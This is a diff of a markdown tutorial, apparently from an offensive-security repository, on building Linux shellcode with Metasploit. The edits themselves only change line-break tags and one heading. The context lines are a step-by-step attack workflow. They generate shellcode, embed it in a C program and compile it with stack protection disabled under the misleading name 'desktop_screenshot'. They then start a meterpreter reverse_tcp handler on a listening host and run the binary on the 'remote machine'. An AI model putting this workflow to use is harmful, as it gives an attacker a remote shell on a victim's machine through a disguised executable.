@@ -48,7 +48,7 @@ sudo mkdir shellcode
 cd shellcode
 ```
 
-<br /><br />
+<br />
 
 #### Use Metasploit to Build Shellcode in C Format
 
@@ -60,7 +60,7 @@ cd shellcode
 
 ```
 
-<br /><br />
+<br />
 
 #### See whats written inside chars.raw (optional)
 
@@ -68,7 +68,7 @@ cd shellcode
    cat chars.raw
 ```
 
-<br /><br />
+<br />
 
 #### Parse shellcode data and store it into a local bash variable
 
@@ -76,7 +76,7 @@ cd shellcode
    pa=$(cat chars.raw | grep -v "=" | tr -d '"; ' | tr -d '\n')
 ```
 
-<br /><br />
+<br />
 
 #### Insert the C shellcode created into a C program
 
@@ -98,7 +98,7 @@ cd shellcode
    echo "}" >> payload.c
 ```
 
-<br /><br />
+<br />
 
 #### See whats written inside payload.c (optional)
 
@@ -106,7 +106,7 @@ cd shellcode
    cat payload.c
 ```
 
-<br /><br />
+<br />
 
 #### Use GCC to compile the C program (make it executable)
 
@@ -114,7 +114,7 @@ cd shellcode
  sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
 ```
 
-<br /><br />
+<br />
 
 #### Start metasploit multi handler
 
@@ -124,16 +124,16 @@ cd shellcode
    sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
 ```
 
-<br /><br />
+<br />
 
-#### Execute C Program (remote machine)
+#### Execute the C Program (remote machine)
 
 ```
 chmod +x desktop_screenshot
 sudo ./desktop_screenshot
 ```
 
-<br /><br />
+<br />
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#exercise-objectives)
 
